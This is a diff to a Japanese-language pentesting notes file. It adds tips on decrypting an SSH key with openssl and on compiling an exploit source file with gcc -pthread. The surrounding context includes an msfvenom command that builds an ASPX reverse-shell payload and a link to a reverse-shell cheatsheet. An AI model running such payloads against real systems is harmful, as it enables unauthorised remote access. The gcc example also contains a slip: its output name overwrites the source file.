@@ -244,6 +244,16 @@ $ msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -o rev.a
 
 参考：[MSFVenom Reverse Shell Payload Cheatsheet (with & without Meterpreter) | Infinite Logins](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
 
+### SSH
+
+``` bash
+# 鍵の復号
+openssl rsa -in encrypted -out decrypted
+
+```
+
+- SSHで`sign_and_send_pubkey: no mutual signature supported`が出る場合は古いSSHを使う
+
 ## スキャンツールまとめ
 
 ### ポートスキャン
@@ -1236,6 +1246,17 @@ $ plt
 Breakpoint 5 at 0x401040 (system@plt)
 
 ```
+
+## gccのTips
+
+- `undefined reference to pthread_create`のようなエラーが出る場合`-pthread`オプションを付ける
+
+``` bash
+# https://stackoverflow.com/questions/1662909/undefined-reference-to-pthread-create-in-linux
+gcc -pthread 40616.c -o 40616.c
+```
+
+
 
 ## angrのサンプル
 
